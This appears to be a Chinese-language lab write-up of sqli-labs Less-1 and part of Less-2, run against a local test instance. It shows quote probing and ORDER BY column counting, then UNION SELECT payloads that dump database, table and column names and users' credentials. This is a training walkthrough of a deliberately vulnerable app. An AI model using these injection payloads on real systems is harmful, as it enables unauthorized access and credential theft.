sql-labs Less-1~4

#Less-1(单引号字符型注入)
进入 http://127.0.0.1/sql/Less-1 ，显示如下：

在 http://127.0.0.1/sql/Less-1 后依次输入/?id=1、/?id=2、/?id=3…，显示如下：



发现应该没什么问题，再在后面输入’改成 http://127.0.0.1/sql/Less-1/?id=1'：

我们可以看到报错且id=1’时提交到sql的语句形成的’1’’LIMIT 0,1多了一个’（第二个）。那要如何把多余的’去掉呢？
尝试’ or 1=1–+,此时sql构造的语句就变成了’1’or 1’LIMIT 0,1（这步是看能否成功注入）
![6](https://github.com/yzhk/yzhk.github.io/blob/master/2021/01/22/sql-labs-Less-1/id=1' or 1=1.png)
可以看到正常输出了。这个时候可以用order by求有几列数据（order by实际上是对指定列的数据进行排序），用二分法求出有3列，
就用 http://127.0.0.1/sql/Less-1/?id=1'order by 3–+ ，超过3就会报错：
![7](https://github.com/yzhk/yzhk.github.io/blob/master/2021/01/22/sql-labs-Less-1/id=1' order by 4–+.png)
此时可以用union进行注入，union的作用是在当前一组数据后再加一组数据，且当id的数据在库中不存在时，会直接输出；如果id在库中存在，则输出当前id在库中的数据（此时可以id=-1，使当前id的数据为空，输出我们加进去的数据）
注意：用union输入的数据的列数要与本来的数据的列数相同；
输入 http://127.0.0.1/sql/Less-1/?id=1'union select 1,2,3–+
![8](https://github.com/yzhk/yzhk.github.io/blob/master/2021/01/22/sql-labs-Less-1/id=1' union select 1,2,3–+.png)
因为id=1时，库中有数据，所以输出当前id在库中的数据，我们把id=-1：
![9](https://github.com/yzhk/yzhk.github.io/blob/master/2021/01/22/sql-labs-Less-1/id=-1' union select 1,2,3–+.png)
这时就输出了我们加入的数据。
这个时候就可以暴库了，
http://127.0.0.1/sql/Less-1/?id=-1'union select 1,group_concat(schema_name),2 from information_schema.schemata–+
![10](https://github.com/yzhk/yzhk.github.io/blob/master/2021/01/22/sql-labs-Less-1/id=-1'union select 1,group_concat(schema_name),2 from information_schema.schemata–+.png)
然后选要爆的数据库的数据表，这里是选security数据库，
http://127.0.0.1/sql/Less-1/?id=-1'union select 1,group_concat(table_name),2 from information_schema.tables where table_schema=’security’–+
![11](https://github.com/yzhk/yzhk.github.io/blob/master/2021/01/22/sql-labs-Less-1/id=-1'union select 1,group_concat(table_name),2 from information_schema.tables where table_schema=’security’–+.png)
再选要爆的数据表的数据列，这里选users数据表，
http://127.0.0.1/sql/Less-1/?id=-1'union select 1,group_concat(column_name),2 from information_schema.columns where table_name=’users’–+
![12](https://github.com/yzhk/yzhk.github.io/blob/master/2021/01/22/sql-labs-Less-1/id=-1'union select 1,group_concat(column_name),2 from information_schema.columns where table_name=’users’–+.png)
最后就可以爆数据了，
http://127.0.0.1/sql/Less-1/?id=-1'union select 1,username,password from users where id=1–+
![13](https://github.com/yzhk/yzhk.github.io/blob/master/2021/01/22/sql-labs-Less-1/id=-1'union select 1,username,password from users where id=1–+.png)
http://127.0.0.1/sql/Less-1/?id=-1'union select 1,username,password from users where id=2–+
![14](https://github.com/yzhk/yzhk.github.io/blob/master/2021/01/22/sql-labs-Less-1/id=-1'union select 1,username,password from users where id=2–+.png)
……
也可以用group_concat函数爆数据，
http://127.0.0.1/sql/Less-1/?id=-1'union select 1,group_concat(username),group_concat(password) from users–+
![15](https://github.com/yzhk/yzhk.github.io/blob/master/2021/01/22/sql-labs-Less-1/id=-1'union select 1,group_concat(username),group_concat(password) from users–+.png)
这里就把我们要的用户名和密码都拿到了。

#Less-2(布尔型注入)
进入http://127.0.0.1/sql/Less-2 ,输入/?id=1。
再输入’ and 1=1–+、’ and 1=2–+进行判断能不能用’字符注入，发现都报错，所以应该不能用’字符注入。
再尝试用and 1=1–+、and 1=2–+，发现前者正常输出，后者既不输出也不报错，由此可以判断可以用整数型进行注入。
用order by查明列数，接下来跟Less-1差不多’
